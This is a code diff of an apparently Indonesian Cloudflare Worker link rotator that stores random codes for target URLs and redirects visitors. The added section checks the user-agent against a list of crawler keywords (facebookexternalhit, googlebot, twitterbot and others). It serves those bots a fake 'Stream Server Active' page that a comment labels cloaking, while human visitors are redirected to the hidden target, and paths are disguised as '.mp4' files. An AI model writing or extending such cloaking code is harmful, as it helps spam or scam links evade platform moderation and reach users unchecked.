@@ -2,19 +2,16 @@ export default {
   async fetch(request, env) {
     const url = new URL(request.url);
 
-    // 1. API: MEMPROSES DAN MENYIMPAN BULK GENERATE LINK (OPTIMASI BATCH)
+    // 1. API: MEMPROSES DAN MENYIMPAN BULK GENERATE LINK
     if (url.pathname === "/api/generate-links" && request.method === "POST") {
       try {
         const { links, count } = await request.json();
-        
         if (!links || !Array.isArray(links) || links.length === 0) {
           return new Response(JSON.stringify({ success: false, error: "Daftar link kosong." }), { status: 400 });
         }
 
         const variations = [];
-        const statements = []; // Waduh penampung kueri batch
-        
-        // Siapkan kueri untuk database D1
+        const statements = [];
         const insertStmt = env.DB.prepare("INSERT INTO link_rotators (random_code, target_url) VALUES (?, ?)");
 
         for (const targetUrl of links) {
@@ -24,14 +21,11 @@ export default {
             for (let j = 0; j < 9; j++) {
               kodeAcak += karakter.charAt(Math.floor(Math.random() * karakter.length));
             }
-
-            // Alih-alih langsung dijalankan (.run()), kita kumpulkan dulu ke dalam array statements
             statements.push(insertStmt.bind(kodeAcak, targetUrl));
             variations.push(kodeAcak);
           }
         }
 
-        // EKSEKUSI BATCH: Kirim semua data sekaligus dalam 1 detakan. Sangat cepat & anti-timeout!
         if (statements.length > 0) {
           await env.DB.batch(statements);
         }
@@ -44,7 +38,7 @@ export default {
       }
     }
 
-    // 2. MAIN ENGINE: PENGALIHAN / REDIRECT
+    // 2. MAIN ENGINE: PENGALIHAN + SISTEM ANTI-BOT CRAWLER
     if (
       url.pathname !== "/" && 
       url.pathname !== "" && 
@@ -54,11 +48,45 @@ export default {
     ) {
       try {
         let kodeUrl = url.pathname.replace("/", "");
-
         if (kodeUrl.endsWith(".mp4")) {
           kodeUrl = kodeUrl.replace(".mp4", "");
         }
 
+        // DETEKSI USER-AGENT BOT
+        const userAgent = (request.headers.get("user-agent") || "").toLowerCase();
+        
+        // Daftar keyword bot yang sering merayapi link Facebook
+        const isBot = 
+          userAgent.includes("facebookexternalhit") || 
+          userAgent.includes("facebot") || 
+          userAgent.includes("facebookplatform") ||
+          userAgent.includes("googlebot") || 
+          userAgent.includes("twitterbot") || 
+          userAgent.includes("bot") || 
+          userAgent.includes("crawl") || 
+          userAgent.includes("spider");
+
+        // JIKA YANG DATANG ADALAH BOT FACEBOOK / BOT LAIN
+        if (isBot) {
+          // Umpan balik berupa halaman statis aman palsu (Kloaking)
+          const botUmpanHtml = `
+          <!DOCTYPE html>
+          <html lang="id">
+          <head>
+              <meta charset="UTF-8">
+              <title>Video Storage Engine</title>
+              <style>body{font-family:sans-serif;background:#0e121a;color:#fff;text-align:center;padding:50px;}</style>
+          </head>
+          <body>
+              <h2>Stream Server Active</h2>
+              <p>Status: File MP4 encoded successfully. Ready for stream streaming.</p>
+          </body>
+          </html>
+          `;
+          return new Response(botUmpanHtml, { headers: { "Content-Type": "text/html; charset=utf-8" } });
+        }
+
+        // JIKA YANG DATANG MANUSIA ASLI (PROSES SEPERTI BIASA)
         const dataLink = await env.DB.prepare("SELECT target_url FROM link_rotators WHERE random_code = ?")
           .bind(kodeUrl)
           .first();
